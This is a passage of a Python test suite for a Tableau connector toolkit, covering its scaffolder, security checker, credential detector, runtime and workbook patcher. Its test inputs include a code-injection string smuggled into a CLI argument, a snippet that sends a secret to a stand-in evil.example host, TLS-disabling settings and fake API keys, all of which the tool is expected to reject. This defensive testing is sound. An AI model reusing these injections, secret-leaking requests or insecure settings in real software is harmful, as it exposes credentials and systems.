    # --- --input-key can't inject code ----------------------------------------------
    for val in ['k""";__import__("os").system("id");"""', "k'];import os;x=['", "a\\b"]:
        old, sys.stderr = sys.stderr, io.StringIO()
        try:
            new_connector.main(["--name", "x", "--out", str(tmp / "inj.py"), "--input-key", val, "--force"])
            ok = False
        except SystemExit as e:
            ok = e.code not in (0, None)
        finally:
            sys.stderr = old
        case("new_connector rejects --input-key %r" % val[:24], ok)
    good = scaffold(input_key="Customer ID (US)")
    case("--input-key with spaces/parens scaffolds as a CONFIG literal",
         "INPUT_KEY = 'Customer ID (US)'" in good and "TE-COMPILE" not in _errs(good), _errs(good))

    # --- every scaffold combination compiles; only TODO/undefined-helper errors -------
    allowed = {"TE-TODO", "TE-NAME"}
    bad_combos = []
    combos = [("rest", au, pg) for au in new_connector.AUTHS for pg in new_connector.PAGES]
    combos += [("graphql", au, "none") for au in new_connector.AUTHS] + [("sql", "none", "none")]
    for kind, au, pg in combos:
        kw = dict(kind=kind, auth=au, pagination=pg)
        if au == "oauth2_cc":
            kw["token_url"] = "https://auth.example.com/oauth2/token"
        src = scaffold(**kw)
        extra = _errs(src) - allowed
        if extra:
            bad_combos.append(("%s/%s/%s" % (kind, au, pg), sorted(extra)))
    case("all %d scaffold combinations pass check_script except TODOs" % len(combos), not bad_combos, bad_combos)

    # --- the worked example is clean ---------------------------------------------------
    ex = (ROOT / "examples" / "nasa_neows" / "nasa_neows.py").read_text()
    case("examples/nasa_neows passes check_script with the current runtime",
         not _errs(ex) and C.is_canonical_runtime(C.extract_runtime(ex)), _errs(ex))

    # --- detector: real key formats that were missed --------------------------------
    pos = {
        "uuid key": 'api_key = "f47ac10b-58cc-4372-a567-0e02b2c3d479"',
        "uuid header": 'h = {"X-Api-Key": "a23e4567-e89b-12d3-a456-426614174000"}',
        "stripe": 'x = "sk_live_' + "4eC39HqLyjWDarjtT1zdp7dc" + '"',
        "sendgrid": 'x = "SG.' + "abcdefghijklmnop.qrstuvwxyzABCDEFGH" + '"',
        "dashed password": 'password = "Summer-2024-Pass"',
        "pw dict key": 'cfg = {"pw": "hunter2hunter2"}',
    }
    missed = [k for k, v in pos.items() if not C.has_credential(v)]
    case("detector catches UUID / Stripe / SendGrid / dashed passwords", not missed, missed)
    ini = "[db]\nhost = db.example.com\npassword = Pa55w0rd-x9\n"
    case("detector catches unquoted name=value in config members",
         C.credential_spans(ini, python=False, config=True) and not C.credential_spans(ini, python=False))

    # --- more TE-TLS shapes; TE-TABS / TE-COLNAME / loopback -----------------------
    tls_cases = {
        "verify_mode = 0": "import ssl\nc = ssl.create_default_context()\nc.verify_mode = 0\nreturn {'a': [1]}\n",
        "ssl=False": "def f(x):\n    return x\nf(ssl=False)\nreturn {'a': [1]}\n",
        "{'verify': False}": "kw = {'verify': False}\nreturn {'a': [1]}\n",
        "sslmode disable": "q = {'sslmode': 'disable'}\nreturn {'a': [1]}\n",
        "TrustServerCertificate": "q = {'TrustServerCertificate': 'yes'}\nreturn {'a': [1]}\n",
        "'CERT_NONE' string": "q = {'cert_reqs': 'CERT_NONE'}\nreturn {'a': [1]}\n",
    }
    missed = [k for k, v in tls_cases.items() if "TE-TLS" not in _errs(v)]
    case("TE-TLS catches verify_mode / ssl=False / dict / sslmode / TrustServerCertificate", not missed, missed)
    sql_tab = 'SQL = """\nSELECT a,\n\tb\nFROM t\n"""\nreturn {"a": [SQL]}\n'
    case("tab inside a triple-quoted string is not TE-TABS", "TE-TABS" not in _errs(sql_tab), _errs(sql_tab))
    br = minimal(base, "/pages").replace('SCHEMA = {"id": "integer"}', 'SCHEMA = {"id": "integer", "a]b": "string"}')
    case("TE-COLNAME: [ ] in a column name is an error", "TE-COLNAME" in _errs(br), _errs(br))
    sneaky = ("import requests\nk = get_secret('x')\n"
              "r = requests.get('http://127.evil.example/x', headers={'k': k}, timeout=5)\nreturn {'a': [1]}\n")
    case("127.evil.example is not loopback (TE-HTTP)", "TE-HTTP" in _errs(sneaky), _errs(sneaky))

    # --- rules that had no test ----------------------------------------------------
    err_cases = {
        "TE-AWAIT": "await x\nreturn {'a': [1]}\n",
        "TE-SIGNAL": "import signal\nsignal.alarm(5)\nreturn {'a': [1]}\n",
        "TE-INTERACTIVE": "x = input('key? ')\nreturn {'a': [x]}\n",
        "TE-RETURN-NONE": "x = 1\nreturn None\n",
        "TE-TODO": "x = 1  # TODO(tabext): fill me\nreturn {'a': [x]}\n",
    }
    for rule, src in err_cases.items():
        got = _errs(src)
        case("checker flags %s" % rule, rule in got, got)
    warn_cases = {
        "TE-GLOBAL": "def f():\n    global X\n    X = 1\nf()\nreturn {'a': [1]}\n",
        "TE-RETURN-LAST": "return {'a': [1]}\nx = 2\n",
        "TE-RETURN-SHAPE": "return [1, 2, 3]\n",
        "TE-NOCOERCE": "import pandas as pd\ndf = pd.DataFrame({'a': [1]})\nreturn df.to_dict('list')\n",
    }
    for rule, src in warn_cases.items():
        got = _rules(src, "warning")
        case("checker warns %s" % rule, rule in got, got)
    case("checker notes TE-PRINT", "TE-PRINT" in _rules("print('hi')\nreturn {'a': [1]}\n", "info"))
    full = minimal(base, "/pages")
    case("checker notes TE-DEPS (requests)", "TE-DEPS" in _rules(full, "info"))
    case("checker warns TE-BUDGET", "TE-BUDGET" in _rules(full.replace("TIME_BUDGET_S = 25", "TIME_BUDGET_S = 40"),
                                                          "warning"))
    case("checker flags TE-CONFIG", "TE-CONFIG" in _errs(full.replace("MAX_ROWS = 500000\n", "")))
    case("checker flags TE-SCHEMA", "TE-SCHEMA" in _errs(full.replace('SCHEMA = {"id": "integer"}',
                                                                       'SCHEMA = {"id": "int"}')))

    # --- runtime v3 behavior ----------------------------------------------------------
    res, err, _t, _e = run(rt_script(
        "return to_tableau([{'r': '1,234.5'}, {'r': '1,5'}, {'r': '2.5'}], {'r': 'real'})\n"))
    case("commas stripped only as thousands separators", err is None and res["r"] == [1234.5, None, 2.5], err or res)
    res, err, _t, _e = run(rt_script(
        "import decimal\nreturn to_tableau([{'d': 1767225600000000000}], {'d': 'datetime'}) if False else "
        "{'d': to_tableau([{'d': 1767225600000000000}], {'d': 'datetime'})['d'], "
        "'i': to_tableau([{'i': decimal.Decimal('9007199254740993')}], {'i': 'integer'})['i']}\n"))
    case("epoch nanoseconds and exact large Decimal integers", err is None and res["d"] == ["2026-01-01 00:00:00"]
         and res["i"] == [9007199254740993], err or res)
    res, err, _t, _e = run(rt_script(
        "s = 'supersecretvalue1'\nremember_secret(s)\n"
        "def rows():\n    raise ValueError('boom ' + s + ' at https://h.example/x?api_key=zz')\n    yield {}\n"
        "return to_tableau(rows(), {'a': 'string'})\n"))
    case("exceptions while fetching are redacted and query-stripped", err and "tabext: ValueError" in err
         and "supersecretvalue1" not in err and "api_key=zz" not in err and "?<query removed>" in err, err)
    res, err, _t, _e = run(rt_script(
        "def rows():\n    yield {'a': {'x': 1}['response']}\nreturn to_tableau(rows(), {'a': 'string'})\n"))
    case("a KeyError surfaces as a readable tabext error (not TabPy's misleading 404)",
         err and "tabext: KeyError" in err, err)
    res, err, _t, _e = run(rt_script(
        "a = items_at({'data': None}, 'data')\nb = items_at({'x': {'data': [1, 2]}}, 'x.data')\n"
        "try:\n    items_at({'message': 'rate limit'}, 'data')\n    c = 'no error'\n"
        "except RuntimeError as e:\n    c = str(e)\n"
        "return {'a': [len(a)], 'b': [len(b)], 'c': [c]}\n"))
    case("items_at: null -> [], nested path, missing path raises", err is None and res["a"] == [0]
         and res["b"] == [2] and "not found" in res["c"][0] and "message" in res["c"][0], err or res)
    res, err, _t, _e = run(rt_script(
        "return {'a': [_retry_after('2'), _retry_after('Wed, 21 Oct 2015 07:28:00 GMT'), _retry_after('soon')],"
        " 'l': [_is_loopback('http://127.evil.example/'), _is_loopback('http://127.0.0.2/'),"
        " _is_loopback('http://[::1]:9/')]}\n"))
    case("Retry-After seconds/HTTP-date; real loopback check", err is None and res["a"] == [2.0, 0.0, None]
         and res["l"] == [False, True, True], err or res)
    os.environ["TABLEAU_TABEXT_MOCK_USER"] = "reporting"
    try:
        res, err, _t, _e = run(rt_script(
            "u = get_secret('mock.user', redact=False)\n"
            "return to_tableau([{'a': 'reporting team ' + u}], {'a': 'string'})\n"))
    finally:
        del os.environ["TABLEAU_TABEXT_MOCK_USER"]
    case("get_secret(redact=False) leaves identities in the data", err is None
         and res["a"] == ["reporting team reporting"], err or res)
    res, err, _t, _e = run(rt_script(
        "return {'a': [http_get(%r, headers={'X-Api-Key': 'unregistered-literal'})]}\n" % (base + "/redir-open")))
    case("credential-named header blocks a cross-origin redirect", err and "redirected to another host" in err, err)

    # --- .twbx round trip, member scan, overwrite guard ---------------------------------
    import zipfile
    sp = tmp / "c.py"
    sp.write_text(s)
    r = subprocess.run([py, pw, "new", "--script", str(sp), "--out", str(tmp / "base.twb")],
                       capture_output=True, text=True)
    twbx = tmp / "pkg.twbx"
    with zipfile.ZipFile(twbx, "w", zipfile.ZIP_DEFLATED) as z:
        z.write(tmp / "base.twb", "pkg.twb")
        z.writestr("Data/notes.txt", "hello")
    r = subprocess.run([py, pw, "replace", str(twbx), "--script", str(sp), "--out", str(tmp / "out.twbx")],
                       capture_output=True, text=True)
    ok = r.returncode == 0 and zipfile.is_zipfile(tmp / "out.twbx")
    if ok:
        with zipfile.ZipFile(tmp / "out.twbx") as z:
            ok = sorted(z.namelist()) == ["Data/notes.txt", "pkg.twb"] and z.read("Data/notes.txt") == b"hello"
    case(".twbx replace keeps the other members", ok, r.stderr[-200:])
    r = subprocess.run([py, pw, "replace", str(twbx), "--script", str(sp), "--out", str(tmp / "out.twbx")],
                       capture_output=True, text=True)
    case("patch refuses to overwrite an existing --out without --overwrite", r.returncode != 0
         and "--overwrite" in (r.stderr + r.stdout), r.stderr[-200:])
    leaky = tmp / "leaky.twbx"
    with zipfile.ZipFile(leaky, "w") as z:
        z.write(tmp / "base.twb", "leaky.twb")
        z.writestr("Data/conn.ini", "[db]\npassword = Pa55w0rd-x9\n")
    r = subprocess.run([py, pw, "replace", str(leaky), "--script", str(sp), "--out", str(tmp / "leaky2.twbx")],
                       capture_output=True, text=True)
    case("patch refuses a .twbx whose member holds a credential", r.returncode != 0
         and not (tmp / "leaky2.twbx").exists(), r.stderr[-200:])
    r = subprocess.run([py, pw, "replace", str(tmp / "base.twb"), "--script", str(sp), "--out", str(tmp / "x.twbx")],
                       capture_output=True, text=True)
    case("a .twb source can't be written as .twbx", r.returncode != 0 and not (tmp / "x.twbx").exists())
    dtd = tmp / "dtd.twb"
    dtd.write_text("<?xml version='1.0'?>\n<!DOCTYPE w [<!ENTITY a 'aaaa'>]>\n<workbook>&a;</workbook>\n")
    r = subprocess.run([py, str(ROOT / "scripts" / "inspect_workbook.py"), str(dtd)], capture_output=True, text=True)
    case("workbooks with a DOCTYPE/ENTITY are refused", r.returncode != 0 and "DOCTYPE" in (r.stderr + r.stdout))

    # --- inspect --extract writes redacted 0600 files ---------------------------------
    lk = tmp / "lk.py"
    lk.write_text(s + "\napi_key = 'abcd1234efgh5678'\n")
    subprocess.run([py, pw, "new", "--script", str(sp), "--out", str(tmp / "lk.twb")], capture_output=True)
    wbx = C.Workbook(tmp / "lk.twb")
    node = next(C.table_extensions(wbx.root))[2]
    node.find("script-code").text = lk.read_text()
    (tmp / "lk2.twb").write_text(wbx.serialize())
    ext = tmp / "ext"
    r = subprocess.run([py, str(ROOT / "scripts" / "inspect_workbook.py"), str(tmp / "lk2.twb"), "--extract", str(ext)],
                       capture_output=True, text=True)
    files = list(ext.glob("*.py"))
    ok = files and "abcd1234efgh5678" not in files[0].read_text() and (files[0].stat().st_mode & 0o077) == 0
    case("inspect --extract redacts and writes 0600", ok, r.stderr[-200:] or r.stdout[-200:])

    # --- keystore file backend: round trip, literal b64: values ------------------------
    sf = tmp / "sec" / "secrets.json"
    env = dict(os.environ, TABLEAU_TABEXT_SECRETS_FILE=str(sf))
    code = ("import sys; sys.path.insert(0, %r); import keystore as K\n"
            "K.store_secret('t.one', 'b64:not-really-base64', backend='file')\n"
            "K.store_secret('t.two', 'pl\"ain\\\\val', backend='file')\n"
            "a = K.get_secret('t.one')[0] == 'b64:not-really-base64'\n"
            "b = K.get_secret('t.two')[0] == 'pl\"ain\\\\val'\n"
            "import os, stat; m = stat.S_IMODE(os.stat(K.secrets_file()).st_mode)\n"
            "print(a, b, oct(m))\n" % str(ROOT / "scripts"))
    r = subprocess.run([py, "-I", "-c", code], capture_output=True, text=True, env=env)
    case("keystore file backend round-trips (incl. a literal 'b64:' value), mode 0600",
         r.stdout.strip() == "True True 0o600", (r.stdout + r.stderr)[-200:])


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--tabpy")
    ap.add_argument("--tabpy-user")
    a = ap.parse_args()
    srv, base = start_mock()
    via = None
    if a.tabpy:
        headers = {}
        if a.tabpy_user:
            import keystore
            pw, _ = keystore.get_secret("tabpy.password")
            headers["Authorization"] = "Basic " + base64.b64encode(("%s:%s" % (a.tabpy_user, pw)).encode()).decode()
        via = {"url": a.tabpy, "headers": headers}
    for label, v in [("in-process", None)] + ([("tabpy", via)] if via else []):
        n0 = len(RESULTS)
        test_contract_and_coercion(base, v)
        test_cursor_link(base, v)
        test_errors(base, v)
        test_input_table(base, v)
        test_protections(base, v)
        for i in range(n0, len(RESULTS)):
            ok, name, d = RESULTS[i]
            RESULTS[i] = (ok, "[%s] %s" % (label, name), d)
    test_validator()
    test_checker()
    test_runtime_edges()
    test_detector()
    test_static()
    test_collision()
    test_workbook(base)
    test_review_fixes(base)
    r = subprocess.run([sys.executable, "-I", str(ROOT / "tools" / "gen_cli_docs.py"), "--check"],
                       capture_output=True, text=True)
    case("docs/cli.md matches the scripts' --help", r.returncode == 0, r.stdout + r.stderr)
    srv.shutdown()
    fails = [r for r in RESULTS if not r[0]]
    for ok, name, d in RESULTS:
        print("%s  %s%s" % ("PASS" if ok else "FAIL", name, "" if ok else "  -> " + d))
    print("\n%d passed, %d failed" % (len(RESULTS) - len(fails), len(fails)))
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
